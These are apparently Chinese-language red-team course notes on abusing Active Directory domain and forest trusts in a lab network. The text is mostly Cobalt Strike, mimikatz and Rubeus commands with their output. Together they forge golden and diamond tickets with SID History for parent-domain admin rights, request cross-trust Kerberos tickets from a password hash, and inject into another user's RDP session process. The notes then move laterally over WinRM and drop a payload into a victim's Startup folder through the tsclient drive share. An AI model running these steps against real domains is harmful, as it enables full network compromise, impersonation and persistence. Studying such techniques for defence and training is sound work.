# Forest & Domain Trusts

域信任：单向信任，双向信任。（或者出站信任，入站信任）

域信任传递链：A信任B，B信任C，那么A也信任C


# Parent/Child

如果在子域已经获取到了DA权限，可以利用SID History取得父域的DA权限。

> If we have Domain Admin privileges in the child, we can also gain Domain Admin privileges in the parent using a TGT with a special attribute called SID History. SID History was designed to support migration scenarios, where a user would be moved from one domain to another. To preserve access to resources in the "old" domain, the user's previous SID would be added to the SID History of their new account. So when creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will grant access to all resources in the parent.

如何实现？

首先需要知道父域DA组的SID
```
beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid

objectsid                                   
---------                                   
S-1-5-21-378720957-2217973887-3501892633-512

beacon> powershell Get-DomainController -Domain cyberbotic.io | select Name

Name              
----              
dc-1.cyberbotic.io
```

这里```S-1-5-21-378720957-2217973887-3501892633-512```就是我们下面操作需要的SID

1. 金票

制作金票，sids填入上面查询到的值
```
mimikatz # kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /startoffset:-10 /endin:600 /renewmax:10080 /ticket:cyberbotic.kirbi
User      : Administrator
Domain    : dev.cyberbotic.io (DEV)
SID       : S-1-5-21-3263068140-2042698922-2891547269
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-378720957-2217973887-3501892633-512 ;
ServiceKey: 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa - aes256_hmac
Lifetime  : 3/11/2021 2:49:33 PM ; 3/12/2021 12:49:33 AM ; 3/18/2021 2:49:33 PM
-> Ticket : cyberbotic.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

参数解释

- /user is the username to impersonate.
- /domain is the current domain.
- /sid is the current domain SID.
- /sids is the SID of the target group to add ourselves to.
- /aes256 is the AES256 key of the current domain's krbtgt account.
- /startoffset sets the start time of the ticket to 10 mins before the current time.
- /endin sets the expiry date for the ticket to 60 mins.
- /renewmax sets how long the ticket can be valid for if renewed.


导入
```
beacon> make_token CYBER\Administrator FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\cyberbotic.kirbi
beacon> ls \\dc-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
 
 beacon> rev2self
```


2. 钻票

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

[...snip...]

beacon> make_token CYBER\Administrator FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\diamond.kirbi

beacon> ls \\dc-1\c$
[*] Listing: \\dc-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings

[...snip...]
```


**如果 dev.cyberbotic.io 也有一个子域（例如 test.dev.cyberbotic.io），那么 TEST 中的 DA 将能够使用他们的 krbtgt 立即跳到cyberbotic.io 中的 DA/EA，因为信任是可传递的。**

# One-Way (Inbound)

单向（入站）

dev.cyberbotic.io有一个单向的进站信任
```
beacon> powershell Get-DomainTrust

SourceName      : dev.cyberbotic.io
TargetName      : subsidiary.external
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

因为我们当前是被信任方（本域），所以可以枚举信任方(外域)的DC主机，使用命令：
```
beacon> powershell Get-DomainComputer -Domain subsidiary.external -Properties DNSHostName

dnshostname           
-----------           
ad.subsidiary.external
```

枚举外域的本地管理组成员

```
beacon> powershell Get-DomainForeignGroupMember -Domain subsidiary.external

GroupDomain             : subsidiary.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=subsidiary,DC=external
MemberDomain            : subsidiary.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=subsidiary,
                          DC=external
```

上面的MemberName是一串sid，可以用ConvertFrom-SID转成用户名
```
beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\Subsidiary Admins
```

```Get-NetLocalGroupMember```可以枚举外域机器的本地组成员。这表明```DEV\Subsidiary Admins```是域控制器上本地管理员组的成员
```
beacon> powershell Get-NetLocalGroupMember -ComputerName ad.subsidiary.external

ComputerName : ad.subsidiary.external
GroupName    : Administrators
MemberName   : DEV\Subsidiary Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True
```

枚举本域是否有外域```Subsidiary Admins```组的成员
```
beacon> powershell Get-DomainGroupMember -Identity "Subsidiary Admins" | select MemberName

MemberName
----------
jadams
```

## 方法一：明文密码
jadams是本域用户，而且我们知道他的明文密码:```TrustNo1```，最简单的方式就是输入明文密码访问

```
beacon> make_token DEV\jadams TrustNo1
[+] Impersonated DEV\bfarmer

beacon> ls \\ad.subsidiary.external\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
```

## 方法二：只有哈希，请求两次tgt

如果只有 RC4/AES 等哈希，就需要请求tgt。这里注意，需要请求本域的tgt，然后再根据这个tgt再次请求外域的tgt

请求本域tgt
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jadams /domain:dev.cyberbotic.io /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

[*] Action: Ask TGT
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Using aes256-cts-hmac_sha1 hash: 70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jadams'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFdD [...snip...] MuSU8=

  ServiceName           :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm          :  DEV.CYBERBOTIC.IO
  UserName              :  jadams
  UserRealm             :  DEV.CYBERBOTIC.IO
  StartTime             :  3/16/2021 1:00:28 PM
  EndTime               :  3/16/2021 11:00:28 PM
  RenewTill             :  3/23/2021 1:00:28 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  mnuk66R9/j0cnmZczy8ACxBfn5VcZ5pFubm3tI79KZ4=
```

根据上面的tgt（```doIFdD [...snip...] MuSU8=```这串值），请求外域访问tgt

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:krbtgt/subsidiary.external /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFdD[...snip...]MuSU8= /nowrap

[*] Action: Ask TGS
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'krbtgt/subsidiary.external'
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFMT [...snip...] 5BTA==

  ServiceName           :  krbtgt/SUBSIDIARY.EXTERNAL
  ServiceRealm          :  DEV.CYBERBOTIC.IO
  UserName              :  jadams
  UserRealm             :  DEV.CYBERBOTIC.IO
  StartTime             :  3/16/2021 1:02:06 PM
  EndTime               :  3/16/2021 11:00:28 PM
  RenewTill             :  1/1/0001 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwardable
  KeyType               :  rc4-hmac
  Base64(key)           :  O7B/KR3+DvhlpY6qwrTlHg==
```


根据上面的tgt，请求外域的cifs服务的tgs
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:cifs/ad.subsidiary.external /domain:ad.subsidiary.external /dc:ad.subsidiary.external /ticket:doIFMT[...snip...]5BTA== /nowrap

[*] Action: Ask TGS
[*] Using domain controller: ad.subsidiary.external (10.10.14.55)
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/ad.subsidiary.external'
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFsD [...snip...] JuYWw=

  ServiceName           :  cifs/ad.subsidiary.external
  ServiceRealm          :  SUBSIDIARY.EXTERNAL
  UserName              :  jadams
  UserRealm             :  DEV.CYBERBOTIC.IO
  StartTime             :  3/16/2021 1:08:52 PM
  EndTime               :  3/16/2021 11:00:28 PM
  RenewTill             :  1/1/0001 12:00:00 AM
  Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  HPmz324aewyZ6El4LGoVEksQEvkI3eoSiy7gAlgEXbU=
```

根据生成的tgs，合成```subsidiary.kirbi```
```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\subsidiary.kirbi", [System.Convert]::FromBase64String("doIFiD [...snip...] 5hbA=="))
```

导入session，现在可以访问外域的DC
```
beacon> make_token DEV\jadams FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Daniel\Desktop\subsidiary.kirbi
beacon> ls \\ad.subsidiary.external\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
```


# One-Way (Outbound)

如果域A单向信任域B，那么B可以访问A的资源，A理论上应该不可以访问域B的资源。这一章讨论域A如何在这一前提下访问域B

一个方法是域信任的相反方向上创建的 SQL Server 链接（参考MS SQL Servers那一章）

另一个方法是通过 RDP 驱动器共享（ RDP drive sharing）

cyberbotic.io（上面例子里的A域）对zeropointsecurity.local（上面例子里的B域）有出站信任关系
```
beacon> powershell Get-DomainTrust -Domain cyberbotic.io

SourceName      : cyberbotic.io
TargetName      : zeropointsecurity.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```


使用```Get-DomainForeignGroupMember```表明有一个```Jump Users```的用户组
```
beacon> powershell Get-DomainForeignGroupMember -Domain cyberbotic.io

GroupDomain             : cyberbotic.io
GroupName               : Jump Users
GroupDistinguishedName  : CN=Jump Users,CN=Users,DC=cyberbotic,DC=io
MemberDomain            : cyberbotic.io
MemberName              : S-1-5-21-3022719512-2989052766-178205875-1115
MemberDistinguishedName : CN=S-1-5-21-3022719512-2989052766-178205875-1115,CN=ForeignSecurityPrincipals,DC=cyberbotic,DC=io
```

BloodHound 将显示```Jump Users```对EXCH-1和SQL-1这两台机器有RDP权限

![alt jump](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/jump-users-rdp.png?width=1920)

Get-DomainGPOUserLocalGroupMapping 和 Find-DomainLocalGroupMember 可以显示和上面一样的结果

```
beacon> powershell Get-DomainGPOUserLocalGroupMapping -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName

sql-1.cyberbotic.io
exch-1.cyberbotic.io
```

```
beacon> powershell Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

sql-1.cyberbotic.io
exch-1.cyberbotic.io
```

横向移动到sql-1.cyberbotic.io

查看登录会话
```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> run hostname
sql-1

beacon> net logons
Logged on users at \\localhost:

ZPS\jean.wise
CYBER\SQL-1$
```

查看网络连接
```
beacon> shell netstat -anop tcp | findstr 3389

  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1012
  TCP    10.10.15.90:3389       10.10.18.221:50145     ESTABLISHED     1012
```

查看进程
```
beacon> ps

 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 644   776   ShellExperienceHost.exe      x64   3           ZPS\jean.wise
 1012  696   svchost.exe                  x64   0           NT AUTHORITY\NETWORK SERVICE
 1788  776   SearchUI.exe                 x64   3           ZPS\jean.wise
 3080  776   RuntimeBroker.exe            x64   3           ZPS\jean.wise
 3124  3752  explorer.exe                 x64   3           ZPS\jean.wise
 4960  1012  rdpclip.exe                  x64   3           ZPS\jean.wise
 4980  696   svchost.exe                  x64   3           ZPS\jean.wise
 5008  1244  sihost.exe                   x64   3           ZPS\jean.wise
 5048  1244  taskhostw.exe                x64   3           ZPS\jean.wise
```

下面思考两个问题
1. ```jean.wise```是否有任何特权访问```zeropointsecurity.local```
2. 是否可以访问```zeropointsecurity.local```的445、3389、5985等端口

关于第一个问题，基于目前的域信任（单向-出站）我们无法枚举任何有用信息
第二个问题可以通过```portscan```查看
```
beacon> portscan 10.10.18.0/24 139,445,3389,5985 none 1024
10.10.18.221:3389
10.10.18.221:5985

10.10.18.167:139
10.10.18.167:445
10.10.18.167:3389
10.10.18.167:5985

Scanner module is complete
```

从结果可知我们可以访问域```zeropointsecurity.local```上```dc01``` 和 ```sql01```两台机器上的一些有用的端口


注入当前机器（sql-1.cyberbotic.io）上的```jean.wise```的进程
```
beacon> inject 4960 x64 tcp-local
[+] established link to child beacon: 10.10.15.90
```

显示当前用户已经是```jean.wise```

```
beacon> getuid
[*] You are ZPS\jean.wise
```

在当前用户下使用PowerView已经可以枚举到```zeropointsecurity.local```的域信息
```
beacon> powershell Get-Domain

Forest                  : zeropointsecurity.local
DomainControllers       : {dc01.zeropointsecurity.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : dc01.zeropointsecurity.local
RidRoleOwner            : dc01.zeropointsecurity.local
InfrastructureRoleOwner : dc01.zeropointsecurity.local
Name                    : zeropointsecurity.local
```

上面枚举之所以能成功，是因为我们在```zeropointsecurity.local```域的上下文中，我们没有跨信任执行任何身份验证，只是劫持了一个现有的经过身份验证的会话

如果jean.wise对zeropointsecurity.local有特权访问，那么从该域上下文横向移动将是相当简单的。我们可以弄清楚这jean.wise是一个System Admins域组的成员，它是SQL01上本地Administrators的成员

因为上面端口枚举显示445端口没有开放，但是5985是开放的，可以使用winrm，执行命令
```
beacon> remote-exec winrm sql01.zeropointsecurity.local whoami; hostname

zps\jean.wise
sql01
```
横向移动
```
beacon> jump winrm64 sql01.zeropointsecurity.local pivot-sql-1
[+] established link to child beacon: 10.10.18.221
```

我在这里使用另一个 Pivot 侦听器，因为在 SQL01 上启用了 Windows 防火墙，我们无法将入站连接到 445（因此没有 SMB 侦听器）或其他任意端口，如 4444（因此没有 TCP 侦听器）。SQL-1 上未启用 Windows 防火墙，因此我们可以绑定到高端口并捕获来自 Pivot Listener 的反向连接

如果在 SQL-1 上也启用了 Windows 防火墙，我们可能需要尝试使用```netsh```

即使jean.wise不是 SQL01 上的本地管理员,仍然可以通过已建立的 RDP 通道横向移动。这就是驱动器共享发挥作用的地方

在```jean.wiseSQL-1 ```上的 RDP 会话中，有一个名为 UNC 路径```tsclient```

它为通过 RDP 共享的每个驱动器都有一个挂载点。```\\tsclient\c```是 RDP 会话的原始计算机上的 ```C: 驱动器```，在这种情况下```sql01.zeropointsecurity.local```

```
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     02/20/2021 10:14:59   Program Files
          dir     02/20/2021 10:13:41   Program Files (x86)
          dir     03/10/2021 17:19:54   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/20/2021 10:00:17   SQL2019
          dir     02/17/2021 18:47:03   System Volume Information
          dir     03/16/2021 15:24:24   Users
          dir     02/17/2021 18:47:20   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 1gb      fil     03/16/2021 14:22:21   pagefile.sys
```

我们可以上传一个有效载荷，例如 bat 或 exe 到jean.wise的启动文件夹。下次他们登录时，payload文件自动执行，我们得到一个 shell

```
beacon> cd \\tsclient\c\Users\jean.wise\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 174b     fil     05/15/2021 19:00:25   desktop.ini
 281kb    fil     05/15/2021 20:31:00   pivot.exe
```